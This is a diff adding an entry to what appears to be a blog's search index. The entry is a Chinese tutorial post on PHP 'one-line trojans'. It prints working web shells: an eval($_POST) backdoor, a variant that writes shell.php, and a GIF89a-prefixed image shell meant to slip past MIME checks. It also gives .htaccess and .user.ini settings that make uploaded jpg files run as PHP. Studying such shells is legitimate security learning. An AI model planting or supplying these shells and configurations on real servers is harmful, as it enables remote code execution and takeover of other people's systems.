@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>一句话木马</title>
+      <link href="/2023/04/16/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
+      <url>/2023/04/16/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
+      
+        <content type="html"><![CDATA[<h4 id="什么是一句话木马"><a href="#什么是一句话木马" class="headerlink" title="什么是一句话木马"></a>什么是一句话木马</h4><p>  一句话木马是一种短小精悍的恶意代码，通常只有一行之长。<br>  这种木马可以以上传文件、修改配置等方式将恶意代码植入到受害者服务器上<br>  然后通过一些特殊手法在服务器端执行，以达到入侵控制目的。</p><h4 id="常见的一句话木马"><a href="#常见的一句话木马" class="headerlink" title="常见的一句话木马"></a>常见的一句话木马</h4><p>我们接触的一句话木马大多为这种，它需要在PHP环境中才可使用</p><pre><code>&lt;?php @eval($_POST[cmd]);  ?&gt;</code></pre><h4 id="木马原理"><a href="#木马原理" class="headerlink" title="木马原理"></a>木马原理</h4><pre><code>（1）$_POST[cmd]    $_POST 是 PHP 中的一个超全局变量，POST方式提交的所有变量，都会保存在此数组中，变量名即为键名（2）eval()    eval() 函数在 PHP 中用于执行字符串中的代码并返回执行结果。    该函数对php语法要求严格，所传入语句必须以&quot; ; &quot;号结尾（3）@    符号@的作用是屏蔽该语句的报错信息    如果站点PHP版本&gt;=8.0的话会报错（4）脉络梳理    用eval函数，将我们post方式提交的名为cmd的变量，当做PHP代码执行，cmd变量可为任何攻击代码</code></pre><h4 id="可用于条件竞争的一句话木马"><a href="#可用于条件竞争的一句话木马" class="headerlink" title="可用于条件竞争的一句话木马"></a>可用于条件竞争的一句话木马</h4><pre><code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])；  ?&gt;&#39; ); ?&gt;</code></pre><p>这段代码是用来创建一个名为shell.php的文件，并在其中写入一段代码。<br>这段代码的作用是接受一个POST请求中的cmd参数，并将其作为PHP代码执行。</p><h4 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h4><p><strong>木马内容</strong></p><pre><code>GIF89a&lt;?php @eval($_POST[cmd])；  ?&gt; //GIF89a 为了绕过可能存在的MIME头检测</code></pre><p><strong>.htaccess文件</strong></p><pre><code>&lt;FilesMatch &quot;jpg&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;//大体意思是设置当前目录所有带jpg的文件名都使用php解析//无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行</code></pre><p><strong>.user.ini扩展文件</strong></p><pre><code>auto_prepend_file=shell.jpg //意思就是当前目录中的php文件的页头会自动去包含shell.jpg中的文件内容//auto_append_file 是页尾包含</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 日报 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 日报 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>PHP反序列化</title>
       <link href="/2023/04/16/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
       <url>/2023/04/16/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
